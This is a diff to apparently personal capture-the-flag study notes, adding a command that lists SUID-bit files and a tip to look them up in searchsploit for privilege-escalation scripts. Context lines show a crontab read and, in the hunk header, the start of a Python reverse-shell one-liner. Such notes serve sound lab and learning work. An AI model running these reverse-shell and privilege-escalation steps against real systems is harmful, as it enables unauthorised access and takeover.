@@ -170,6 +170,11 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 #### My Notes
 - [PrivEsc](https://github.com/Ruhanyat-994/myCTF/tree/master/THM-CTF/my-materials/PrivEsc)
 
+- #### Suid Bit Set
+```sh
+find / -type f -perm -04000 -ls 2>/dev/null
+```
+- After getting the files which have suid bit set you can search them through `searchsploit` , you can get scripts for privesc sometime.
 - #### **Finding info in the crontab**
 ```sh
 cat /etc/crontab 
